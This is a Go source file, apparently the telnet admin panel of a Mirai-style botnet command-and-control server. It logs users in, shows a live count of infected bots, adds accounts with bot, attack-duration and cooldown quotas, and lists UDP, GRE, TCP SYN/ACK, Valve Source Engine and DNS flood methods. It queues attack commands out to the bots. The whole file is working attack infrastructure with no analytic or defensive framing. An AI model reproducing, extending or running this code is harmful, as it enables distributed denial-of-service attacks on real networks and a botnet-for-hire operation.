package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
      this.conn.Write([]byte("\033[?1049h"))
      this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
      this.conn.Write([]byte("\033[2J\033[1H"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

   // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;30mUsername\033[01;37m:\033[97;3m \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;30mPassword\033[01;37m:\033[97;3m \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\n\033[31mAn error has occurred, press any key in order to exit.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
 				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
       	this.conn.Write([]byte("\033[\033[01;30m" + username + "\033[01;37m@\033[\033[01;30mbotnet \033[01;37m# \033[0;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {
	      this.conn.Write([]byte("\033[2J\033[1H"))

            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;34mEnter new username: \x1b[1;36m"))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;34mEnter new password: \x1b[1;36m"))
            new_pw, err := this.ReadLine(true)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;34mEnter wanted bot count (-1 for full net): \x1b[1;36m"))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;34mMax attack duration (-1 for none): \x1b[1;36m"))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;34mCooldown time (0 for none): \x1b[1;36m"))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\r\n\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "botcount" || cmd == "bots" || cmd == "count" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[97;3m%s:\t\x1b[1;36m%d\r\n", k, v)))
            }
            continue
        }

     /* if cmd == "bots" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[1;96mTotal Bots\033[1;97m:\t%d\r\n", botCount)))
            continue
		}  */


         if err != nil || cmd == "attacks" || cmd == "ATTACKS" || cmd == "?" {
            this.conn.Write([]byte("\033[97;3mUDPPLAIN                   FLOOD:\x1b[1;36m UDP-Flood optimized for more pps \r\n"))
            this.conn.Write([]byte("\033[97;3mGREETH                     FLOOD:\x1b[1;36m GRE-Flood using ETH\r\n"))
            this.conn.Write([]byte("\033[97;3mGREIP                      FLOOD:\x1b[1;36m GRE-Flood using IP\r\n"))
            this.conn.Write([]byte("\033[97;3mSTOMP                      FLOOD:\x1b[1;36m TCP-ACK Flood (Mitigation) \r\n"))
            this.conn.Write([]byte("\033[97;3mVSE                        FLOOD:\x1b[1;36m Valve Source Engine \r\n"))
            this.conn.Write([]byte("\033[97;3mUDP                        FLOOD:\x1b[1;36m UDP-Flood with more options\r\n"))
            this.conn.Write([]byte("\033[97;3mACK                        FLOOD:\x1b[1;36m TCP-ACK Flood\r\n"))
            this.conn.Write([]byte("\033[97;3mSYN                        FLOOD:\x1b[1;36m TCP-SYN Flood\r\n"))
            this.conn.Write([]byte("\033[97;3mDNS                        FLOOD:\x1b[1;36m DNS Resolver Flood \r\n"))
		    continue

        }

        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("error\r\n")))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("error\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
